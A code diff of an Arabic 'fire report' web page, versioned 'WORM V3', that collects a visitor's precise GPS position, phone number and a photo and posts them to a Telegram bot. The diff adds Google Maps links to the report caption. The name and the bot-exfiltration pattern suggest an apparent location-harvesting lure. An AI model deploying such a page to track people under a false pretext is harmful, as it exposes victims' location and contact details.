@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بلاغ حريق - WORM V2</title>
+    <title>بلاغ حريق - WORM V3</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -76,6 +76,18 @@
             font-size: 14px;
         }
         .btn-gps:hover { background: #1f8b1f; }
+        .gps-link {
+            display: inline-block;
+            margin-top: 8px;
+            padding: 8px 15px;
+            background: #1a4a8a;
+            border-radius: 8px;
+            color: #7fcfff;
+            text-decoration: none;
+            font-weight: bold;
+            border: 1px solid #3a8aff;
+        }
+        .gps-link:hover { background: #2a6aba; }
     </style>
 </head>
 <body>
@@ -92,6 +104,7 @@
     <div class="gps-box">
         <div>📍 الموقع (GPS):</div>
         <div id="gpsDisplay"><span>⏳ جاري الجلب...</span></div>
+        <div id="gpsLinkContainer" style="margin-top:8px;"></div>
         <button class="btn-gps" id="refreshGpsBtn">🔄 إعادة محاولة الموقع</button>
     </div>
 
@@ -105,10 +118,20 @@
 
     let userLat = "غير متاح";
     let userLon = "غير متاح";
-    let gpsAttempts = 0;
 
-    // ======== دالة جلب الموقع مع إعادة المحاولة ========
-    function getGPS(force = false) {
+    // ======== دالة تحديث رابط خرائط جوجل ========
+    function updateGoogleMapsLink(lat, lon) {
+        const container = document.getElementById('gpsLinkContainer');
+        if (lat !== "غير متاح" && lon !== "غير متاح") {
+            const url = `https://www.google.com/maps?q=${lat},${lon}`;
+            container.innerHTML = `<a href="${url}" target="_blank" class="gps-link">🗺️ فتح في خرائط جوجل</a>`;
+        } else {
+            container.innerHTML = '';
+        }
+    }
+
+    // ======== دالة جلب الموقع ========
+    function getGPS() {
         const gpsDisplay = document.getElementById('gpsDisplay');
         gpsDisplay.innerHTML = `<span>⏳ جاري جلب الموقع...</span>`;
 
@@ -122,6 +145,7 @@
                 userLat = pos.coords.latitude;
                 userLon = pos.coords.longitude;
                 gpsDisplay.innerHTML = `<span style="color:#7fff7f;">✅ ${userLat}, ${userLon}</span>`;
+                updateGoogleMapsLink(userLat, userLon);
                 document.getElementById('status').innerHTML = '✅ GPS جاهز';
                 document.getElementById('status').style.color = '#7fff7f';
             },
@@ -136,6 +160,7 @@
                 gpsDisplay.innerHTML = `<span style="color:#ff6666;">${msg}</span>`;
                 document.getElementById('status').innerHTML = '⚠️ ' + msg;
                 document.getElementById('status').style.color = '#ffaa00';
+                updateGoogleMapsLink("غير متاح", "غير متاح");
             },
             {
                 enableHighAccuracy: true,
@@ -150,7 +175,7 @@
 
     // زر إعادة المحاولة
     document.getElementById('refreshGpsBtn').addEventListener('click', function() {
-        getGPS(true);
+        getGPS();
     });
 
     // ======== إرسال البيانات إلى تليجرام ========
@@ -159,11 +184,19 @@
         statusDiv.innerHTML = '⏳ جاري الإرسال...';
         statusDiv.style.color = '#ffaa00';
 
+        // بناء رابط خرائط جوجل
+        let mapsLink = "غير متاح";
+        if (lat !== "غير متاح" && lon !== "غير متاح") {
+            mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        }
+
         try {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('document', imageFile);
-            formData.append('caption', `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n📍 الموقع: ${lat}, ${lon}`);
+            formData.append('caption', 
+                `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n📍 الموقع (رابط): ${mapsLink}`
+            );
 
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                 method: 'POST',
@@ -206,7 +239,6 @@
             document.getElementById('status').innerHTML = '⏳ جاري جلب الموقع... حاول مرة أخرى خلال 3 ثوان';
             document.getElementById('status').style.color = '#ffaa00';
             getGPS();
-            // نرسل بعد 3 ثواني حتى لو لم ينجح (نرسل "غير متاح" لكن نحاول)
             setTimeout(() => {
                 sendToTelegram(phone, file, userLat, userLon);
             }, 3000);
